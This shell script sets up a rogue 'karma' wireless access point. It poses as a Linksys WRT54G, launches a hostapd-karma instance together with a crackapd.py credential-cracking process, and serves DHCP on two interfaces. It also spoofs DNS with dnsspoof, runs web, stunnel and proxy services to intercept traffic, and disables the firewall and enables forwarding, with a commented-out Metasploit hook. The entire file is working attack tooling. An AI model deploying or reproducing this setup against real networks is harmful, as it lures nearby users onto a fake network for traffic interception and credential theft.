phy=wlan0
phy0="wlan0_0"

hostname WRT54G
echo hostname WRT54G
sleep 2

# Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
export EXNODE=`cat ~/hostapd/etc/hostapd-karma-multi.conf | grep ennode | cut -f2 -d"="`
echo $EXNODE
mkfifo $EXNODE
/usr/bin/python ~/hostapd/rogue-ap/crackapd.py&

# Start hostapd
~/hostapd/hostapd/hostapd ~/hostapd/etc/hostapd-karma-multi.conf&
sleep 5
ifconfig $phy
ifconfig $phy0
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1

dhcpd -cf ~/hostapd/etc/dhcpd.conf $phy
dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf ~/hostapd/etc/dhcpd-two.conf $phy0
dnsspoof -i $phy -f ~/hostapd/etc/dns.txt&
dnsspoof -i $phy0 -f ~/hostapd/etc/dns.txt&
service apache2 start
service stunnel4 start
tinyproxy -c ~/hostapd/etc/tinyproxy.conf
#msfconsole -r simple-karma.rc

service ferm stop
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F

echo "Hit enter to kill me"
read
pkill hostapd
rm /tmp/crackapd.run
rm $EXNODE
pkill airbase-ng
pkill dhcpd3
pkill dhcpd
pkill dnsspoof
pkill tinyproxy
pkill stunnel4
service apache2 stop
iptables -t nat -F
service ferm start
